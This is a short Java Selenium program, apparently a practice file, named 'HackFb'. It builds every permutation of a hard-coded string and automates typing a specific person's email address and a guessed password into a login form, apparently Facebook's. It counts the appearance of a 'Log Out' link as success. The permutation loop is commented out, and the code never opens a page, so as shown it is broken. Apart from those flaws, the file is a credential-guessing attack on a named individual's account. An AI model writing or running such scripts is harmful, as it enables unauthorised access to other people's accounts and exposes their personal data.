package PractiseSeleniumWebDriver;

import java.util.HashSet;
import java.util.Set;

import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.interactions.Action;
import org.openqa.selenium.interactions.Actions;
import org.openqa.selenium.support.ui.Select;
import org.testng.annotations.Test;

public class HackFb {
	
	String pass="duttravi";
	static int count=0;
	
	Set<String> set=new HashSet<>();
	
	public static void main(String args[]) throws InterruptedException
	{
		
		HackFb obj=new HackFb();
		
		obj.permute(obj.pass, 0);
		
		System.out.println(obj.set);
		
		System.out.println(obj.set.contains("ravidutt"));
		
		
		ChromeDriver driver=new ChromeDriver();
		
//		for(String s:obj.set)
//		{
			Actions act=new Actions(driver);
			
			driver.findElementByName("email").sendKeys("rishabhenu@gmail.com");
			
			act.sendKeys(Keys.TAB).perform();
			
			act.sendKeys(obj.pass).perform();
			
			act.sendKeys(Keys.RETURN).perform();
			try
			{
				driver.findElementByLinkText("Log Out").click();
				System.out.println(obj.pass);
			}catch(Exception e) {}
			driver.quit();
//		}
		
		
	}
	
	
	void permute(String s,int a)
	{
		int b=s.length();
		
		if(a==b)
		{
			set.add(s);
		}
		else
		{
			for(int i=a;i<b;i++)
			{
				s=swap(s,a,i);
				permute(s,a+1);
				s=swap(s,a,i);
			}
		}
	}
	
	
	
	String swap(String s,int a,int b)
	{
		char c[]=s.toCharArray();
		
		char temp=c[a];
		c[a]=c[b];
		c[b]=temp;
		return String.valueOf(c);
	}

}
